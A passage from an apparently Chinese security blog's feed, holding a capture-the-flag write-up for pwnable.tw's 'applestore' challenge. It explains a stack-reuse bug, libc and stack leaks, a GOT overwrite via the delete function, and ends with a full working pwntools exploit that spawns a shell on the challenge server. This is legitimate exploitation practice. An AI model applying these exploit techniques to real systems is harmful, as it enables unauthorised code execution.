<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://bbs.pediy.com/thread-259408.htm">https://bbs.pediy.com/thread-259408.htm</a></p>
<p><a href="https://kirin-say.top/2018/06/06/pwnable-tw-Silver-Bullet/">https://kirin-say.top/2018/06/06/pwnable-tw-Silver-Bullet/</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>stackoverflow</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>applestore</title>
    <url>/archives/ac06426f.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-applestore"><a href="#pwnable-tw-applestore" class="headerlink" title="pwnable.tw - applestore"></a>pwnable.tw - applestore</h2><span id="more"></span>

<hr>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看下保护，动态链接，也给了libc</p>
<img src="https://i.loli.net/2021/08/01/3xWcOSBCH1fUDTl.png"  />

<p>逻辑很简单，符号表都全的，阅读起来基本没什么困难</p>
<p>主要是存item的结构体需要自己分析一下，通过insert和create函数分析可得</p>
<p>存item信息的是一个个0x20大小的堆块，通过类似链表的方式存储</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct_item</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* item_name;</span><br><span class="line">    <span class="keyword">int</span> item_price;</span><br><span class="line">    struct_item* latter;</span><br><span class="line">    struct_item* former;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在ida中创建就是这样（那个蓝色的XREF以及之后的东西可以忽略，就是交叉搜索留下的痕迹</p>
<p><img src="https://i.loli.net/2021/08/01/VNITP2naYrzm1kE.png"></p>
<blockquote>
<p>关于ida中创建结构体：可参考<a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html">https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html</a></p>
</blockquote>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>程序其他地方都没啥问题，只有checkout函数这里送了一个iPhone8，有点可疑，我们看一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  struct_item v2; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(&amp;v2.item_name, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v2.item_price = <span class="number">1</span>;</span><br><span class="line">    insert(&amp;v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当前面买的东西价值总数到了7174的时候，会送一个iPhone8</p>
<blockquote>
<p>7174 = 6 * 199 + 20 * 299</p>
</blockquote>
<p>这个iPhone8的struct_item是放在栈上的就在<code>ebp-0x20</code>，我们再看一下别的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span>&#123;...</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">22</span>]; <span class="comment">// [esp+26h] [ebp-22h] BYREF</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span>&#123;...</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">22</span>]; <span class="comment">// [esp+26h] [ebp-22h] BYREF</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cart</span><span class="params">()</span></span>&#123;...</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">22</span>]; <span class="comment">// [esp+26h] [ebp-22h] BYREF</span></span><br></pre></td></tr></table></figure>

<p>这些函数都有个可以在<code>[ebp-0x22] 到 [ebp]</code>写的机会</p>
<p>而这些函数都是从同一个handler函数的switch语句分别进入的，也就是说他们有相同的ebp</p>
<p><img src="https://i.loli.net/2021/08/01/1fUJH6ygAlxr2YZ.png"></p>
<p>（如上图，左边一列绿色的数字就是栈帧，可在Options&gt;General&gt;Stack pointer打开</p>
<p>从而，我们可以控制iPhone8的内容</p>
<blockquote>
<p>ps. 之前我看nptr就输个数字给这么大空间就觉得奇怪hhh</p>
</blockquote>
<p>那么下面就是泄露libc，想办法调用system(‘/bin/sh’)</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>cart函数会输出item_name这个地址指向的内容，那只要在iPhone8的相同位置填进got表上随便一个函数的地址，就能泄露libc了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iphone8</span><br><span class="line">+-------------+------------------+------------------+------------------+</span><br><span class="line">|     got     | \x00\x00\x00\x00 | \x00\x00\x00\x00 | \x00\x00\x00\x00 |</span><br><span class="line">+-------------+------------------+------------------+------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;y\x00&#x27;</span> + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">4</span>*<span class="number">3</span></span><br></pre></td></tr></table></figure>

<div class="note danger"><p>payload最后的12个’\x00’如果不写，这个地方会被修改，主要是latter的地方被修改，cart的循环就会出问题</p>
</div>

<h3 id="调用system"><a href="#调用system" class="headerlink" title="调用system"></a>调用system</h3><p>这里的想法是：覆盖atoi的got表为system的地址，然后找办法调用它</p>
<p>可以发现delete函数里有可以利用的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v2-&gt;latter;     <span class="comment">// v2+0x8</span></span><br><span class="line">      v5 = v2-&gt;former;     <span class="comment">// v2+0xc</span></span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        v5-&gt;latter = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        v4-&gt;former = v5;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个想法是直接覆盖，构造出来就是这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iphone8</span><br><span class="line">+--------+------------------+--------------------+---------------------+</span><br><span class="line">|        | \x00\x00\x00\x00 | libc.sym[&#x27;system&#x27;] | elf.got[&#x27;atoi&#x27;]-0x8 |</span><br><span class="line">+--------+------------------+--------------------+---------------------+</span><br><span class="line">//第一格填任意地址，只要合法，可以打印就行</span><br><span class="line">//第四格的-0x8，仔细模拟一下就能明白</span><br></pre></td></tr></table></figure>

<p>但问题是有两句赋值语句，<code>v5-&gt;latter = v4;</code>确实达到了目的；但是<code>v4-&gt;former = v5;</code>会破坏system的代码</p>
<p>行不通</p>
<p>之后参考了网上大佬的wp，发现可以在delete函数里覆盖handler函数的ebp，这样返回handler的时候，输入的位置就是可控的</p>
<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>首先我们知道链表的头myCart的地址，通过myCart的latter可以泄露第一个item的地址 (泄露方法同泄露libc</p>
<p>再通过第一个item的latter可以泄露第二个item的地址，一直迭代，到第27个就是iPhone8的地址，也就是<code>ebp-0x20</code></p>
<p>就泄露了ebp的地址</p>
<h3 id="覆写-amp-getshell"><a href="#覆写-amp-getshell" class="headerlink" title="覆写&amp;getshell"></a>覆写&amp;getshell</h3><p>这里同样构造iPhone8的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iphone8</span><br><span class="line">+--------+------------------+------------------------+----------------+</span><br><span class="line">|        | \x00\x00\x00\x00 | elf.got[&#x27;atoi&#x27;] + 0x22 | ebp_addr - 0x8 |</span><br><span class="line">+--------+------------------+------------------------+----------------+</span><br><span class="line">//第一格填任意地址，只要合法，可以打印就行</span><br></pre></td></tr></table></figure>

<p>为什么是<code>elf.got[&#39;atoi&#39;] + 0x22</code>？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">handler</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">22</span>]; <span class="comment">// [esp+16h] [ebp-22h] BYREF</span></span><br></pre></td></tr></table></figure>

<p>如何调用呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">handler</span><span class="params">()</span></span>&#123;...</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(nptr) )</span><br></pre></td></tr></table></figure>

<p>这里又会遇到跟<a href="https://innerway-xq.github.io/archives/c5963d96.html">hacknote</a>一样的问题，传过去的参数前面有一堆乱七八糟的东西，这里就是system_addr</p>
<p>同样办法解决，命令写<code>&#39;;/bin/sh&#39;</code></p>
<blockquote>
<p><a href="https://blog.csdn.net/freedom2028/article/details/7104131">关于linux中连续命令执行</a></p>
</blockquote>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./applestore&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10104</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./applestore&quot;)</span></span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">item</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(item))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span>(<span class="params">data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span>():</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 * 199 + 20 * 299</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;y\x00&#x27;</span> + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">4</span>*<span class="number">3</span></span><br><span class="line">cart(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;27: &#x27;</span>)</span><br><span class="line">libc.address = u32(r.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">r.success(<span class="string">&quot;libc_address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">my_cart = <span class="number">0x0804B068</span></span><br><span class="line">tmp = my_cart</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    payload = <span class="string">&#x27;y\x00&#x27;</span> + p32(tmp+<span class="number">0x8</span>) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">4</span>*<span class="number">3</span></span><br><span class="line">    cart(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;27: &#x27;</span>)</span><br><span class="line">    tmp = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">stack = tmp</span><br><span class="line">ebp_addr = stack + <span class="number">0x20</span></span><br><span class="line">r.success(<span class="string">&quot;stack_addr: &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># cover</span></span><br><span class="line">payload = <span class="string">&#x27;27&#x27;</span> + p32(stack) + <span class="string">&#x27;a&#x27;</span> * <span class="number">4</span> + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>] + <span class="number">0x22</span>) + p32(ebp_addr - <span class="number">0x8</span>)</span><br><span class="line">delete(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">payload = p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;;/bin/sh&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://www.cnblogs.com/p4nda/p/7522494.html">https://www.cnblogs.com/p4nda/p/7522494.html</a></p>
<p><a href="https://blog.csdn.net/qq_43189757/article/details/102850665">https://blog.csdn.net/qq_43189757/article/details/102850665</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
      </tags>
  </entry>
</search>
